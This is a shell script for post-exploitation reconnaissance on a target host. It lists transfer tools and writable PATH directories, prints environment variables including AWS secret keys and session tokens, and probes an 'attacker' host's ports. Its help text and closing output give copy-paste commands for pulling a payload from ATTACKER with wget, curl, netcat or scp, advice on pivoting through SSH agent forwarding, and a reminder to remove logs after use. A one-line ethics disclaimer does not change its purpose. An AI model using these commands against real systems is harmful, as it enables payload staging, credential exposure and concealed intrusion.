#!/bin/sh
# transfer_capability_check.sh
# POSIX sh script to enumerate local transfer capabilities and optionally
# probe reachability to a given remote "attacker" host/ports so you can
# decide how best to fetch a payload from your host machine.
#
# Safe, read-only by default. Does not upload or download files unless you
# explicitly run the example commands shown in the results.
#
# This updated version adds a robust --help that documents flags, behavior,
# and copy-paste examples for common transfer methods and probing use-cases.
#
# Usage:
#   ./transfer_capability_check.sh [--target HOST] [--ports P1,P2,...] [--user USER] [--timeout N] [--json]
#
# Exit status:
#   0  script completed (probes may have reported closed/unavailable ports)
#   2  invalid arguments provided

TARGET=""
PORTS=""
REMOTE_USER="root"
JSON_OUT=0
TIMEOUT=3

usage() {
  cat <<'EOF'
transfer_capability_check.sh — determine how best to transfer files to/from this host

Purpose
  - Enumerates local transfer tooling and environment (ssh, scp, sftp, curl, wget, nc, python, etc).
  - Performs an optional, non-invasive probe of a remote "attacker" host to check reachable ports
    (useful to decide whether to host a payload on your attacker box and have the target pull it).
  - Produces clear suggestions and copy/paste commands for common transfer methods (HTTP pull, scp/sftp, netcat).
  - The script is read-only and will not transfer files or run payloads; it only probes reachability.

Safety & ethics
  - Do not run this against hosts you do not own or are not authorized to test.
  - Probe operations are lightweight (TCP connect, HTTP HEAD) and respect the provided timeout.
  - Output can contain sensitive environment variables — treat results (logs) as sensitive data.

Flags
  --target HOST
        Optional. IP or hostname of the remote host to probe (your attacker host).
        If omitted, the script performs a local capability scan only (no remote probes).

  --ports P1,P2,...
        Optional. Comma-separated list of ports to probe on the target (default when --target set:
        22,80,443,8080,9001).
        Examples: --ports 22,80,8000 or --ports 22

  --user USER
        Optional. Username to use when checking SSH publickey auth on the target (default: root).
        The script performs a non-interactive publickey check (ssh -o BatchMode=yes) — this will
        not prompt for passwords.

  --timeout N
        Optional. Connection timeout in seconds for probes (default: 3).

  --json
        Optional. Print a compact JSON-like summary in addition to the human report.

  -h, --help
        Print this help and exit.

Behavior notes
  - The script uses nc (netcat) for raw TCP probes when available; for HTTP ports it will try curl/wget.
  - SSH publickey checks use BatchMode, so no password is requested; a failed check does not imply
    password auth is disabled on the server, only that publickey auth did not succeed with the current
    agent/keys.
  - If nc/curl/wget are not installed on this host, remote probes will be limited or skipped.
  - The script does not assume symmetric capabilities on both sides (e.g., just because nc exists here
    does not guarantee it exists on the attacker host). It reports local tools + remote reachability so
    you can choose a transfer method to try.

Examples
  # Local-only scan (tools, PATH writable entries, envvars)
  ./transfer_capability_check.sh

  # Probe an attacker host for common ports
  ./transfer_capability_check.sh --target 10.0.0.5

  # Probe a specific single port (e.g., SSH on non-standard port)
  ./transfer_capability_check.sh --target attacker.example.com --ports 2222 --user attacker --timeout 4

  # Output suggestions and JSON summary
  ./transfer_capability_check.sh --target 10.0.0.5 --json

Practical transfer examples (copy/paste after confirming a method works)
  # 1) HTTP pull (recommended if target can reach attacker on port 8000)
  # On attacker:
  python3 -m http.server 8000
  # On target:
  wget http://ATTACKER:8000/payload -O /tmp/payload || curl -fsSL http://ATTACKER:8000/payload -o /tmp/payload

  # 2) SCP (interactive password or key-based)
  scp -P 22 attacker@ATTACKER:/home/attacker/payload /tmp/payload

  # 3) Netcat (ad-hoc; confirm nc flags on both ends)
  # On attacker (listen and send):
  nc -l -p 4444 < payload
  # On target (pull):
  nc ATTACKER 4444 > /tmp/payload

EOF
}

# simple arg parse (POSIX)
while [ $# -gt 0 ]; do
  case "$1" in
    --target) shift; TARGET="$1"; shift ;;
    --ports) shift; PORTS="$1"; shift ;;
    --user) shift; REMOTE_USER="$1"; shift ;;
    --json) JSON_OUT=1; shift ;;
    --timeout) shift; TIMEOUT="$1"; shift ;;
    -h|--help) usage; exit 0 ;;
    *)
      printf '%s\n' "Unknown arg: $1" >&2
      usage
      exit 2
      ;;
  esac
done

# default probe ports if TARGET supplied and no custom ports
if [ -n "$TARGET" ] && [ -z "$PORTS" ]; then
  PORTS="22,80,443,8080,9001"
fi

# helper: print section header
hdr() {
  printf '\n## %s ##\n' "$1"
  printf '---\n'
}

# check tool presence
check_tool() {
  cmd="$1"
  if command -v "$cmd" >/dev/null 2>&1; then
    printf '%s: yes\n' "$cmd"
    return 0
  else
    printf '%s: no\n' "$cmd"
    return 1
  fi
}

# attempt TCP probe using nc variants; return 0 on success, 1 on failure, 2 if nc unavailable
probe_tcp_nc() {
  host="$1"; port="$2"; to="$3"
  if command -v nc >/dev/null 2>&1; then
    # Try common nc styles
    nc -z -w "$to" "$host" "$port" >/dev/null 2>&1 && return 0
    # busybox nc often lacks -z; try a short connect attempt
    nc -w "$to" "$host" "$port" >/dev/null 2>&1 && return 0
    return 1
  fi
  return 2
}

# attempt HTTP probe using curl/wget; return 0 success, 1 failure, 2 client missing
probe_http() {
  host="$1"; port="$2"; to="$3"
  url="http://${host}:${port}/"
  if command -v curl >/dev/null 2>&1; then
    curl -s --connect-timeout "$to" -I "$url" >/dev/null 2>&1 && return 0
    return 1
  elif command -v wget >/dev/null 2>&1; then
    wget -q --timeout="$to" --spider "$url" >/dev/null 2>&1 && return 0
    return 1
  fi
  return 2
}

# Start scan
hdr "Local capability scan"
printf 'Checked on: %s\n' "$(date '+%Y-%m-%d %H:%M:%S %Z')"
printf '\nInstalled tools (simple presence check):\n'
TOOLS="ssh scp sftp curl wget nc ncat netcat python python3 perl ruby ftp rsync git smbclient openssl"
for t in $TOOLS; do
  check_tool "$t"
done

# PATH writable check (cursory)
hdr "PATH writable check (cursory)"
OLDIFS=$IFS; IFS=":"; total=0; writable=0
for p in $PATH; do
  total=$((total+1))
  [ -z "$p" ] && p="(empty)"
  if [ -d "$p" ] && [ -w "$p" ]; then
    printf 'writable: %s\n' "$p"
    writable=$((writable+1))
  fi
done
IFS=$OLDIFS
printf 'PATH total=%s writable=%s\n' "$total" "$writable"

# environment variables presence
hdr "Environment variables (selected)"
vars='HOME SHELL PATH USER LOGNAME TERM LANG EDITOR PAGER AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN'
for v in $vars; do
  val="$(env | grep -m1 "^${v}=" || true)"
  if [ -z "$val" ]; then
    printf '%s is UNSET\n' "$v"
  else
    printf '%s\n' "$val"
  fi
done
printf '\nNote: env outputs may contain secrets (treat probe output as sensitive)\n'

# Sudo / privilege hints
hdr "Sudo and privilege hints"
if command -v sudo >/dev/null 2>&1; then
  printf 'sudo present: yes\n'
  # try sudo -V safely (some sudo versions write to stderr/stdout differently)
  if sudo -V >/dev/null 2>&1; then
    printf 'sudo -V available; showing brief header lines (first 20 lines):\n'
    sudo -V 2>&1 | sed -n '1,20p'
  else
    printf 'sudo present, but sudo -V invocation did not complete normally in this environment\n'
  fi
else
  printf 'sudo present: no\n'
fi

# dmesg
hdr "dmesg (best-effort)"
if command -v dmesg >/dev/null 2>&1; then
  if dmesg 2>&1 | grep -qi 'permission\|denied\|restricted\|cannot'; then
    printf 'dmesg present but may be restricted for non-root (best-effort tail shown)\n'
    dmesg 2>&1 | tail -n 80
  else
    dmesg 2>&1 | tail -n 200
  fi
else
  printf 'dmesg: not available\n'
fi

# OS / kernel / cpu basics
hdr "OS & Kernel & CPU basics"
if [ -r /proc/version ]; then
  printf 'Kernel (uname -a):\n'; uname -a 2>/dev/null || true
  printf '\n/proc/version (head):\n'; head -n 3 /proc/version 2>/dev/null || true
else
  uname -a 2>/dev/null || true
fi
if command -v lscpu >/dev/null 2>&1; then
  printf '\n--- lscpu (truncated) ---\n'; lscpu 2>/dev/null | sed -n '1,30p'
else
  printf '\n/proc/cpuinfo (model name extract):\n'; grep -m1 'model name' /proc/cpuinfo 2>/dev/null || true
fi

# quick mention of transfer methods available locally
hdr "Transfer methods summary (local)"
printf 'If these are present, common fetch/push methods are available:\n'
printf '- SSH/SCP/SFTP (port 22)\n- HTTP(S) pull via curl/wget (ports 80/443/8080)\n- FTP (port 21)\n- Netcat (nc) for ad-hoc TCP transfer\n- Python simple HTTP server (python -m http.server) to serve files from attacker\n- rsync over SSH if rsync present\n'

# If no target provided, finish with suggestions
if [ -z "$TARGET" ]; then
  hdr "Summary / Suggested methods (local-only scan)"
  printf 'Based on the tools present, possible payload transfer methods you can use (choose appropriate one):\n'
  printf '- If ssh/scp present and you can run ssh server on attacker: use scp from target to pull\n'
  printf '- If curl/wget present and target can reach your attacker via HTTP: serve files on attacker with `python3 -m http.server 8000` and run wget/curl on target\n'
  printf '- If nc present both sides and ports allowed: use netcat to transfer\n'
  printf '- If sftp/scp is only allowed by key and you control the attacker: consider agent-forwarding or using sftp with keys\n'
  printf '\nTo test remote reachability supply --target HOST and optional --ports\n'
  [ "$JSON_OUT" -eq 1 ] && printf '\n{"summary":"local-scan-complete"}\n'
  exit 0
fi

# Remote probing
hdr "Remote probing to target: $TARGET (timeout=${TIMEOUT}s)"
OLDIFS=$IFS; IFS=","
for p in $PORTS; do
  p="$(printf '%s' "$p" | tr -d '[:space:]')"
  [ -z "$p" ] && continue
  printf '\nPort %s: ' "$p"
  probed=0
  # Try nc if present
  if command -v nc >/dev/null 2>&1; then
    probe_tcp_nc "$TARGET" "$p" "$TIMEOUT"
    rc=$?
    if [ $rc -eq 0 ]; then
      printf 'open (tcp connect via nc)\n'
      probed=1
    elif [ $rc -eq 1 ]; then
      printf 'closed/unreachable (nc connect failed)\n'
      probed=1
    fi
  fi
  # Try HTTP probe for web ports
  if [ "$probed" -eq 0 ]; then
    probe_http "$TARGET" "$p" "$TIMEOUT"
    rc=$?
    if [ $rc -eq 0 ]; then
      printf 'HTTP responsive (curl/wget probe)\n'
      probed=1
    elif [ $rc -eq 1 ]; then
      printf 'TCP reachable but no HTTP response\n'
      probed=1
    fi
  fi
  if [ "$probed" -eq 0 ]; then
    printf 'no active probe method available locally (nc/curl/wget missing) or probe inconclusive\n'
  fi
done
IFS=$OLDIFS

# SSH publickey (BatchMode) check — non-interactive, will not prompt for password
hdr "SSH publickey (BatchMode) check to target (no password will be entered)"
if command -v ssh >/dev/null 2>&1; then
  # Pick SSH port: attempt first port from PORTS if numeric, otherwise default 22
  ssh_port=22
  first_port="$(printf '%s' "$PORTS" | awk -F, '{print $1}')"
  case "$first_port" in
    ''|*[!0-9]*) ssh_port=22 ;;
    *) ssh_port="$first_port" ;;
  esac
  ssh -o BatchMode=yes -o ConnectTimeout="$TIMEOUT" -p "$ssh_port" "${REMOTE_USER}@${TARGET}" true >/dev/null 2>&1
  rc=$?
  if [ $rc -eq 0 ]; then
    printf 'SSH publickey auth: ok (you can scp/sftp with keys)\n'
  else
    printf 'SSH publickey auth: failed or not allowed for provided user (BatchMode test failed)\n'
    printf 'If password auth is permitted by the server, you can still use scp/sftp interactively or use ssh -t to get a sudo password prompt.\n'
  fi
else
  printf 'ssh client: not available locally\n'
fi

# Consolidated suggestions
hdr "Consolidated suggestions (what to try next)"
printf '\nAfter confirming which ports/services are reachable, use one of these methods:\n'
printf '\n1) HTTP pull (recommended if port 80/8080 open and curl/wget present):\n'
printf '  On attacker: python3 -m http.server 8000\n'
printf '  On target: wget http://ATTACKER:8000/payload -O /tmp/payload || curl -fsSL http://ATTACKER:8000/payload -o /tmp/payload\n'

printf '\n2) SCP/SFTP (if SSH reachable and you have credentials or keys):\n'
printf '  scp -P <port> attacker@ATTACKER:/path/to/payload /tmp/payload\n'

printf '\n3) Netcat (if nc present on both ends and port open):\n'
printf '  On attacker (listen): nc -l -p 4444 < payload\n'
printf '  On target: nc ATTACKER 4444 > /tmp/payload\n'
printf '  Note: netcat flags differ between implementations; test locally first.\n'

printf '\n4) Agent-forwarding / intermediate pulls:\n'
printf '  Use ssh -A from your attacker into an intermediate host that has key access to the final target, then scp from the intermediate.\n'

printf '\nSecurity note: These are transfer patterns only. Do not execute untrusted payloads. Remove remote artifacts and logs after use.\n'

# JSON summary (small)
if [ "$JSON_OUT" -eq 1 ]; then
  has_ssh=0; command -v ssh >/dev/null 2>&1 && has_ssh=1
  has_scp=0; command -v scp >/dev/null 2>&1 && has_scp=1
  has_wget=0; command -v wget >/dev/null 2>&1 && has_wget=1
  has_curl=0; command -v curl >/dev/null 2>&1 && has_curl=1
  has_nc=0; command -v nc >/dev/null 2>&1 && has_nc=1
  printf '\nJSON-SUMMARY:\n'
  printf '{\n'
  printf '  "target_probed": %s,\n' "[\"$TARGET\"]"
  printf '  "tools": {\n'
  printf '    "ssh": %s,\n' "$has_ssh"
  printf '    "scp": %s,\n' "$has_scp"
  printf '    "wget": %s,\n' "$has_wget"
  printf '    "curl": %s,\n' "$has_curl"
  printf '    "nc": %s\n' "$has_nc"
  printf '  }\n'
  printf '}\n'
fi

printf '\nScan complete. Use the suggestions above to pick a transfer method. Remember to cleanup remote artifacts and logs when finished.\n'
exit 0
